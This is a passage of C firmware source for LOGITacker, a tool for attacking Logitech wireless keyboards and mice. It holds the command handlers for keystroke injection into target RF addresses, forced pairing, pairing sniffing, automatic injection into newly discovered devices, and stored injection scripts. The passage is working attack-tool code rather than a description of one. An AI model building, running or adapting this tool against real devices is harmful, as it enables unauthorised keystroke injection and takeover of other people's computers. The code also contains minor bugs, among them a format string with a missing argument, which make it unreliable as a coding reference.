    while (fds_record_iterate(&rd,&ft) == FDS_SUCCESS) {
        uint32_t err;
        err = fds_record_open(&rd, &flash_record);
        if (err != FDS_SUCCESS) {
            NRF_LOG_WARNING("Failed to open record %08x", err);
            continue; // go on with next
        }

        sprintf((char *) tmp_str, "Record file_id %04x record_key %04x", flash_record.p_header->file_id, flash_record.p_header->record_key);
        NRF_LOG_INFO("%s",nrf_log_push((char*) tmp_str));

        if (fds_record_close(&rd) != FDS_SUCCESS) {
            NRF_LOG_WARNING("Failed to close record");
        }

    }
}
#endif

static void cmd_version(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "LOGITacker by MaMe82\r\n");
    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "Version: %s\r\n", VERSION_STRING);
}


void callback_dummy(nrf_fstorage_evt_t * p_evt) {};
NRF_FSTORAGE_DEF(nrf_fstorage_t m_nfs) =
        {
                .evt_handler    = callback_dummy,
//                .start_addr     = 0xFD000,
//                .end_addr       = 0xFFFFF,
        };
static bool nfs_initiated = false;

static void cmd_erase_flash(nrf_cli_t const * p_cli, size_t argc, char **argv) {
/*
    fds_find_token_t ft;
    memset(&ft, 0x00, sizeof(fds_find_token_t));
    fds_record_desc_t rd;
    while (fds_record_iterate(&rd,&ft) == FDS_SUCCESS) {
        NRF_LOG_INFO("Deleting record...")
        fds_record_delete(&rd);
    }
    fds_gc();
    fds_stat_t stats;
    fds_stat(&stats);
*/

    uint32_t flash_size  = (FDS_PHY_PAGES * FDS_PHY_PAGE_SIZE * sizeof(uint32_t));
    uint32_t end_addr   = helper_flash_end_addr();
    uint32_t start_addr = end_addr - flash_size;

    m_nfs.start_addr = start_addr;
    m_nfs.end_addr = end_addr;


    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "Erasing flash from start addr: %x, pages: %d\n", start_addr, FDS_PHY_PAGES);

/*
    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "Freeable words:  %d\n", stats.freeable_words);
    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "Largest contig:  %d\n", stats.largest_contig);
    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "Words used:      %d\n", stats.words_used);
    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "Words reserved:  %d\n", stats.words_reserved);
    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "Dirty records:   %d\n", stats.dirty_records);
    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "Valid records:   %d\n", stats.valid_records);
    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "Open records:    %d\n", stats.open_records);
    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "Pages available: %d\n", stats.pages_available);
    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "Corruption:      %s\n", stats.corruption ? "yes" : "no");
*/

    if (!nfs_initiated) {
        if (nrf_fstorage_init(&m_nfs, &nrf_fstorage_nvmc, NULL) == NRF_SUCCESS) nfs_initiated = true;
    }
    if (nfs_initiated) nrf_fstorage_erase(&m_nfs, start_addr, FDS_PHY_PAGES, NULL);

    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_RED, "... page erase issued, wait some seconds and re-plug the dongle\n");
}

static void cmd_inject(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    nrf_cli_help_print(p_cli, NULL, 0);
}

static void cmd_inject_target(nrf_cli_t const * p_cli, size_t argc, char **argv)
{
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "inject target %s\r\n", argv[1]);

    if (argc > 1)
    {
        //nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_DEFAULT, "parameter count %d\r\n", argc);

        //parse arg 1 as address
        uint8_t addr[5];
        if (strcmp(argv[1], "USB") == 0) {
            memset(addr,0x00,5);
            nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Trying to send keystrokes to USB keyboard interface\r\n");
        } else {
            if (helper_hex_str_to_addr(addr, 5, argv[1]) != NRF_SUCCESS) {
                nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
                return;
            }

            char tmp_addr_str[16];
            helper_addr_to_hex_str(tmp_addr_str, 5, addr);
            nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Trying to send keystrokes using address %s\r\n", tmp_addr_str);
        }

        //logitacker_keyboard_map_test();
        logitacker_enter_mode_injection(addr);
        return;
    } else {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "device address needed, format has to be xx:xx:xx:xx:xx\r\n");
        return;

    }

}

static void cmd_script_store(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    if (argc == 2)
    {
        if (logitacker_script_engine_store_current_script_to_flash(argv[1])) {
            //NRF_LOG_INFO("storing script succeeded");
            return;
        }
        //NRF_LOG_INFO("Storing script failed");
        return;
    } else {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "store needs a scriptname as first argument\r\n");
        return;

    }

}

static void cmd_script_load(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    if (argc == 2)
    {
        if (logitacker_script_engine_load_script_from_flash(argv[1])) {
            NRF_LOG_INFO("loading script succeeded");
            return;
        }
        NRF_LOG_INFO("loading script failed");
        return;
    } else {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "load needs a script name as first argument\r\n");
        return;

    }

}

static void cmd_script_remove(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    if (argc == 2)
    {
        if (logitacker_script_engine_delete_script_from_flash(argv[1])) {
            NRF_LOG_INFO("deleting script succeeded");
            return;
        }
        NRF_LOG_INFO("deleting script failed");
        return;
    } else {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "delete needs a script name as first argument\r\n");
        return;

    }
}

static void cmd_script_list(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    logitacker_script_engine_list_scripts_from_flash(p_cli);
}

/*
static void cmd_inject_pause(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    logitacker_injection_start_execution(false);
}
*/

static void cmd_inject_execute(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    logitacker_injection_start_execution(true);
}

static void cmd_script_clear(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    logitacker_script_engine_flush_tasks();
    NRF_LOG_INFO("script tasks cleared");
}

static void cmd_script_undo(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    logitacker_script_engine_remove_last_task();
    NRF_LOG_INFO("removed last task from script");
}

static void cmd_inject_onsuccess_continue(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.inject_on_success = OPTION_AFTER_INJECT_CONTINUE;
}

static void cmd_inject_onsuccess_activeenum(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.inject_on_success = OPTION_AFTER_INJECT_SWITCH_ACTIVE_ENUMERATION;
}

static void cmd_inject_onsuccess_passiveenum(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.inject_on_success = OPTION_AFTER_INJECT_SWITCH_PASSIVE_ENUMERATION;
}

static void cmd_inject_onsuccess_discover(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.inject_on_success = OPTION_AFTER_INJECT_SWITCH_DISCOVERY;
}

static void cmd_inject_onfail_continue(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.inject_on_fail = OPTION_AFTER_INJECT_CONTINUE;
}

static void cmd_inject_onfail_activeenum(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.inject_on_fail = OPTION_AFTER_INJECT_SWITCH_ACTIVE_ENUMERATION;
}

static void cmd_inject_onfail_passiveenum(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.inject_on_fail = OPTION_AFTER_INJECT_SWITCH_PASSIVE_ENUMERATION;
}

static void cmd_inject_onfail_discover(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.inject_on_fail = OPTION_AFTER_INJECT_SWITCH_DISCOVERY;
}

static void cmd_option_global_workmode_unifying(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.workmode = OPTION_LOGITACKER_WORKMODE_UNIFYING;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "working mode set to Unifying compatible\r\n");
}

static void cmd_option_global_workmode_lightspeed(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.workmode = OPTION_LOGITACKER_WORKMODE_LIGHTSPEED;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "working mode set to LIGHTSPEED compatible\r\n");
}

static void cmd_option_global_workmode_g700(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.workmode = OPTION_LOGITACKER_WORKMODE_G700;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "working mode set to G700/G700s compatible\r\n");
}

static void cmd_option_global_bootmode_discover(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.bootmode = OPTION_LOGITACKER_BOOTMODE_DISCOVER;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "boot mode set to 'discover'\r\n");
}

static void cmd_option_global_bootmode_usbinject(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.bootmode = OPTION_LOGITACKER_BOOTMODE_USB_INJECT;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "boot mode set to 'usb inject'\r\n");
}

static void cmd_option_global_usbinjecttrigger_onpowerup(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.usbinject_trigger = OPTION_LOGITACKER_USBINJECT_TRIGGER_ON_POWERUP;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "USB injection mode set to 'on power up'\r\n");
}

static void cmd_option_global_usbinjecttrigger_onledupdate(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.usbinject_trigger = OPTION_LOGITACKER_USBINJECT_TRIGGER_ON_LEDUPDATE;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "USB injection mode set to 'on LED state update'\r\n");
}

static void cmd_options_inject_lang(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    if (argc == 2)
    {
        logitacker_script_engine_set_language_layout(logitacker_keyboard_map_lang_from_str(argv[1]));

        return;
    } else {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "need language layout name as first argument (f.e. us, de, da)\r\n");

        return;

    }

}

static void cmd_script_show(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    logitacker_script_engine_print_current_tasks(p_cli);
}

static void cmd_script_string(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    char press_str[NRF_CLI_CMD_BUFF_SIZE] = {0};
    int str_buf_remaining = sizeof(press_str)-1; //keep one byte for terminating 0x00
    for (int i=1; i<argc && str_buf_remaining>0; i++) {
        if (i>1) strcat(press_str, " ");
        str_buf_remaining--;
        int len = strlen(argv[i]);
        if (len > str_buf_remaining) len = str_buf_remaining;
        strncat(press_str, argv[i], len);
        str_buf_remaining -= len;
    }

    logitacker_script_engine_append_task_type_string(press_str);
}

static void cmd_script_altstring(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    char press_str[NRF_CLI_CMD_BUFF_SIZE] = {0};
    int str_buf_remaining = sizeof(press_str)-1; //keep one byte for terminating 0x00
    for (int i=1; i<argc && str_buf_remaining>0; i++) {
        if (i>1) strcat(press_str, " ");
        str_buf_remaining--;
        int len = strlen(argv[i]);
        if (len > str_buf_remaining) len = str_buf_remaining;
        strncat(press_str, argv[i], len);
        str_buf_remaining -= len;
    }

    logitacker_script_engine_append_task_type_altstring(press_str);
}

static void cmd_script_delay(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    if (argc > 1) {
        uint32_t delay_ms;
        if (sscanf(argv[1], "%lu", &delay_ms) != 1) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid delay, argument has to be unsigned int\r\n");
        };

        logitacker_script_engine_append_task_delay(delay_ms);
        return;
    }

    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid delay, argument has to be unsigned int\r\n");
}

static void cmd_script_press(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    char press_str[NRF_CLI_CMD_BUFF_SIZE] = {0};
    int str_buf_remaining = sizeof(press_str)-1; //keep one byte for terminating 0x00
    for (int i=1; i<argc && str_buf_remaining>0; i++) {
        if (i>1) strcat(press_str, " ");
        str_buf_remaining--;
        int len = strlen(argv[i]);
        if (len > str_buf_remaining) len = str_buf_remaining;
        strncat(press_str, argv[i], len);
        str_buf_remaining -= len;
    }

    NRF_LOG_INFO("parsing '%s' to HID key combo report:", nrf_log_push(press_str));

    hid_keyboard_report_t tmp_report;
    logitacker_keyboard_map_combo_str_to_hid_report(press_str, &tmp_report, LANGUAGE_LAYOUT_DE);
    NRF_LOG_HEXDUMP_INFO(&tmp_report, sizeof(hid_keyboard_report_t));

    logitacker_script_engine_append_task_press_combo(press_str);
}


static void cmd_discover_onhit_activeenum(nrf_cli_t const * p_cli, size_t argc, char **argv)
{
    g_logitacker_global_config.discovery_on_new_address = OPTION_DISCOVERY_ON_NEW_ADDRESS_SWITCH_ACTIVE_ENUMERATION;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "on-hit action: start active enumeration of new RF address\r\n");
    return;
}

static void cmd_discover_onhit_passiveenum(nrf_cli_t const * p_cli, size_t argc, char **argv)
{
    g_logitacker_global_config.discovery_on_new_address = OPTION_DISCOVERY_ON_NEW_ADDRESS_SWITCH_PASSIVE_ENUMERATION;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "on-hit action: start passive enumeration of new RF address\r\n");
    return;
}

static void cmd_discover_onhit_autoinject(nrf_cli_t const * p_cli, size_t argc, char **argv)
{
    g_logitacker_global_config.discovery_on_new_address = OPTION_DISCOVERY_ON_NEW_ADDRESS_SWITCH_AUTO_INJECTION;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "on-hit action: enter injection mode and execute injection\r\n");
    return;
}

static void cmd_discover_onhit_continue(nrf_cli_t const * p_cli, size_t argc, char **argv)
{
    g_logitacker_global_config.discovery_on_new_address = OPTION_DISCOVERY_ON_NEW_ADDRESS_CONTINUE;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "on-hit action: continue\r\n");
}

static void cmd_pair_sniff_onsuccess_continue(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.pair_sniff_on_success = OPTION_PAIR_SNIFF_ON_SUCCESS_CONTINUE;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "on-success action: continue\r\n");
}

static void cmd_pair_sniff_onsuccess_discover(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.pair_sniff_on_success = OPTION_PAIR_SNIFF_ON_SUCCESS_SWITCH_DISCOVERY;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "on-success action: enter discover mode\r\n");
}

static void cmd_pair_sniff_onsuccess_passiveenum(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.pair_sniff_on_success = OPTION_PAIR_SNIFF_ON_SUCCESS_SWITCH_PASSIVE_ENUMERATION;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "on-success action: enter passive enumeration mode\r\n");
}

static void cmd_pair_sniff_onsuccess_activeenum(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.pair_sniff_on_success = OPTION_PAIR_SNIFF_ON_SUCCESS_SWITCH_ACTIVE_ENUMERATION;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "on-success action: enter active enumeration mode\r\n");
}

static void cmd_pair_sniff_onsuccess_autoinject(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.pair_sniff_on_success = OPTION_PAIR_SNIFF_ON_SUCCESS_SWITCH_AUTO_INJECTION;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "on-success action: enter injection mode and execute injection\r\n");
}

static void cmd_pair_sniff_run(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    logitacker_enter_mode_pair_sniff();
}

static void cmd_pair_device_run(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    if (argc > 1)
    {
        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_DEFAULT, "parameter count %d\r\n", argc);

        //parse arg 1 as address
        uint8_t addr[5];
        if (helper_hex_str_to_addr(addr, 5, argv[1]) != NRF_SUCCESS) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
            return;
        }

        char tmp_addr_str[16];
        helper_addr_to_hex_str(tmp_addr_str, 5, addr);
        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Trying to force pair using address %s\r\n", tmp_addr_str);
        logitacker_enter_mode_pair_device(addr);
        return;
    }

    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Trying to pair using Unifying global pairing address\r\n");
    logitacker_enter_mode_pair_device(UNIFYING_GLOBAL_PAIRING_ADDRESS);
}

static void cmd_help(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    nrf_cli_help_print(p_cli, NULL, 0);
}

static void cmd_pair(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    if ((argc == 1) || nrf_cli_help_requested(p_cli))
    {
        nrf_cli_help_print(p_cli, NULL, 0);
        return;
    }

    if (argc != 2)
    {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "%s: bad parameter count\r\n", argv[0]);
        return;
    }

    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "%s: unknown parameter: %s\r\n", argv[0], argv[1]);
}

static void cmd_discover_run(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    logitacker_enter_mode_discovery();
}

static void cmd_discover(nrf_cli_t const * p_cli, size_t argc, char **argv)
{
    if ((argc == 1) || nrf_cli_help_requested(p_cli))
    {
        nrf_cli_help_print(p_cli, NULL, 0);
        return;
    }

    if (argc != 2)
    {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "%s: bad parameter count\r\n", argv[0]);
        return;
    }

    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "%s: unknown parameter: %s\r\n", argv[0], argv[1]);
}

static void cmd_devices(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    logitacker_devices_list_iterator_t iter = {0};
    logitacker_devices_unifying_dongle_t * p_dongle = NULL;
    logitacker_devices_unifying_device_t * p_device = NULL;
    while (logitacker_devices_get_next_dongle(&p_dongle, &iter) == NRF_SUCCESS) {
        if (p_dongle != NULL) {

            for (int device_index=0; device_index < p_dongle->num_connected_devices; device_index++) {
                p_device = p_dongle->p_connected_devices[device_index];

                print_logitacker_device_info(p_cli, p_device);
            }
        }
    }
}

static void cmd_devices_remove(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    if (argc > 1)
    {

        //parse arg 1 as address
        uint8_t addr[5];
        if (helper_hex_str_to_addr(addr, 5, argv[1]) != NRF_SUCCESS) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
            return;
        }

        char tmp_addr_str[16];
        helper_addr_to_hex_str(tmp_addr_str, 5, addr);
        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Deleting device %s\r\n", tmp_addr_str);
        logitacker_devices_del_device(addr);
        return;
    }
}

static void cmd_devices_add(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    logitacker_devices_unifying_device_t * p_device;
    if (argc > 1)
    {
        nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "adding device %s as plain injectable keyboard\r\n");

        //parse arg 1 as address
        uint8_t addr[5];
        if (helper_hex_str_to_addr(addr, 5, argv[1]) != NRF_SUCCESS) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
            return;
        }

        char tmp_addr_str[16];
        helper_addr_to_hex_str(tmp_addr_str, 5, addr);
        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Adding device %s\r\n", tmp_addr_str);


        if (logitacker_devices_create_device(&p_device, addr) != NRF_SUCCESS) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "Error adding device %s\r\n", tmp_addr_str);
            return;
        }

        // add keyboard capabilities
        p_device->report_types |= LOGITACKER_DEVICE_REPORT_TYPES_KEYBOARD | LOGITACKER_DEVICE_REPORT_TYPES_MEDIA_CENTER | LOGITACKER_DEVICE_REPORT_TYPES_MULTIMEDIA | LOGITACKER_DEVICE_REPORT_TYPES_POWER_KEYS;

        if (argc > 2) {
            uint8_t key[16] = {0};
            if (helper_hex_str_to_bytes(key, 16, argv[2]) != NRF_SUCCESS) {
                nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid key parameter, format has to be xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\r\n");
                return;
            }

            // add key and mark device as link-encryption enabled
            memcpy(p_device->key, key, 16);
            p_device->key_known = true;
            p_device->caps |= LOGITACKER_DEVICE_CAPS_LINK_ENCRYPTION;

            nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "added key to device\r\n");
        }
    } else {
        nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "syntax to add a device manually:\r\n");
        nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "    devices add <RF-address> [AES key]\r\n");
        nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "example device no encryption   : devices add de:ad:be:ef:01\r\n");
        nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "example device with encryption : devices add de:ad:be:ef:02 023601e63268c8d37988847af1ae40a1\r\n");
    };
}

static void cmd_devices_storage_save(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    if (argc > 1)
    {

        //parse arg 1 as address
        uint8_t addr[5];
        if (helper_hex_str_to_addr(addr, 5, argv[1]) != NRF_SUCCESS) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
            return;
        }

        char tmp_addr_str[16];
        helper_addr_to_hex_str(tmp_addr_str, 5, addr);
        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Storing device %s to flash\r\n", tmp_addr_str);
        logitacker_devices_store_ram_device_to_flash(addr);
        return;
    }
}

// dynamic creation of command addresses
static void cmd_devices_storage_remove(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    if (argc > 1)
    {
        //parse arg 1 as address
        uint8_t addr[5];
        if (helper_hex_str_to_addr(addr, 5, argv[1]) != NRF_SUCCESS) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
            return;
        }

        char tmp_addr_str[16];
        helper_addr_to_hex_str(tmp_addr_str, 5, addr);
        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Deleting device %s from flash\r\n", tmp_addr_str);
        logitacker_devices_remove_device_from_flash(addr);
        return;
    }

}

static void cmd_devices_storage_load(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    if (argc > 1)
    {
        //parse arg 1 as address
        uint8_t addr[5];
        if (helper_hex_str_to_addr(addr, 5, argv[1]) != NRF_SUCCESS) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
            return;
        }

        char tmp_addr_str[16];
        helper_addr_to_hex_str(tmp_addr_str, 5, addr);
        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Restoring device %s from flash\r\n", tmp_addr_str);
        logitacker_devices_unifying_device_t * p_dummy_device;
        logitacker_devices_restore_device_from_flash(&p_dummy_device, addr);
        return;
    }
}

static void cmd_devices_storage_list(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    fds_find_token_t ftok;
    fds_record_desc_t record_desc;
    fds_flash_record_t flash_record;
    memset(&ftok, 0x00, sizeof(fds_find_token_t));

    logitacker_devices_unifying_device_t tmp_device;
    logitacker_devices_unifying_dongle_t tmp_dongle;

    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "list of devices stored on flash:\r\n");
    NRF_LOG_INFO("Devices on flash");
    while(fds_record_find(LOGITACKER_FLASH_FILE_ID_DEVICES, LOGITACKER_FLASH_RECORD_KEY_DEVICES, &record_desc, &ftok) == FDS_SUCCESS) {
        if (fds_record_open(&record_desc, &flash_record) != FDS_SUCCESS) {
            NRF_LOG_WARNING("Failed to open record");
            continue; // go on with next
        }

        logitacker_devices_unifying_device_t const * p_device = flash_record.p_data;

        //we need a writable copy of device to assign dongle data
        memcpy(&tmp_device, p_device, sizeof(logitacker_devices_unifying_device_t));



        if (fds_record_close(&record_desc) != FDS_SUCCESS) {
            NRF_LOG_WARNING("Failed to close record")
        }

        // load stored dongle (without dongle data, classification like "is logitech" would be missing)
        if (logitacker_flash_get_dongle_for_device(&tmp_dongle, &tmp_device) == NRF_SUCCESS) tmp_device.p_dongle = &tmp_dongle;
        print_logitacker_device_info(p_cli, &tmp_device);

    }
}


static void cmd_devices_remove_all(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    logitacker_devices_del_all();
}

static void cmd_options_show(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    logitacker_options_print(p_cli);
}

static void cmd_options_inject_maxautoinjectsperdevice(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    if (argc > 1) {
        int count;
        if (sscanf(argv[1], "%d", &count) != 1) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid argument, auto inject count has to be a integer number, but '%s' was given\r\n", argv[1]);
        } else {
            g_logitacker_global_config.max_auto_injects_per_device = count;
        }
    } else {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid argument, auto inject count has to be a integer number\r\n");
        nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "current setting of maximum per device auto-injects: %d\r\n", g_logitacker_global_config.max_auto_injects_per_device);
    }
}

static void cmd_options_store(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    logitacker_options_store_to_flash();
}

static void cmd_options_erase(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    fds_file_delete(LOGITACKER_FLASH_FILE_ID_GLOBAL_OPTIONS);
}

static void cmd_options_inject_defaultscript(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    if (argc > 1) {
        size_t len = strlen(argv[1]);
        if (len > LOGITACKER_SCRIPT_ENGINE_SCRIPT_NAME_MAX_LEN-1) len = LOGITACKER_SCRIPT_ENGINE_SCRIPT_NAME_MAX_LEN-1;
        memcpy(g_logitacker_global_config.default_script, argv[1], len);
        g_logitacker_global_config.default_script[len] = 0x00;
        return;
    }

    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "default injection script: '%s'\r\n", g_logitacker_global_config.default_script);
}

static void cmd_options_inject_defaultscript_clear(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.default_script[0] = 0x00;
}

static void cmd_options_pairsniff_autostoredevice(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    if (argc > 1)
    {
        if (strcmp(argv[1], "off") == 0 || strcmp(argv[1], "OFF") == 0) g_logitacker_global_config.auto_store_sniffed_pairing_devices = false;
        else if (strcmp(argv[1], "on") == 0 || strcmp(argv[1], "ON") == 0) g_logitacker_global_config.auto_store_sniffed_pairing_devices = true;
    }

    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "auto-store devices after pairing has been sniffed successfully: %s\r\n", g_logitacker_global_config.auto_store_sniffed_pairing_devices ? "on" : "off");
}

static void cmd_options_discover_autostoreplain(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    if (argc > 1)
    {
        if (strcmp(argv[1], "off") == 0 || strcmp(argv[1], "OFF") == 0) g_logitacker_global_config.auto_store_plain_injectable = false;
        else if (strcmp(argv[1], "on") == 0 || strcmp(argv[1], "ON") == 0) g_logitacker_global_config.auto_store_plain_injectable = true;
    }

    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "auto-store discovered devices, if they allow plain injection: %s\r\n", g_logitacker_global_config.auto_store_plain_injectable ? "on" : "off");
}

static void cmd_options_passiveenum_pass_keyboard(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    if (argc > 1)
    {
        if (strcmp(argv[1], "off") == 0 || strcmp(argv[1], "OFF") == 0) g_logitacker_global_config.passive_enum_pass_through_keyboard = false;
        else if (strcmp(argv[1], "on") == 0 || strcmp(argv[1], "ON") == 0) g_logitacker_global_config.passive_enum_pass_through_keyboard = true;
    }

    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "passive-enum USB keyboard pass-through: %s\r\n", g_logitacker_global_config.passive_enum_pass_through_keyboard ? "on" : "off");
}

static void cmd_options_passiveenum_pass_mouse(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    if (argc > 1)
    {
        if (strcmp(argv[1], "off") == 0 || strcmp(argv[1], "OFF") == 0) g_logitacker_global_config.passive_enum_pass_through_mouse = false;
        else if (strcmp(argv[1], "on") == 0 || strcmp(argv[1], "ON") == 0) g_logitacker_global_config.passive_enum_pass_through_mouse = true;

    }

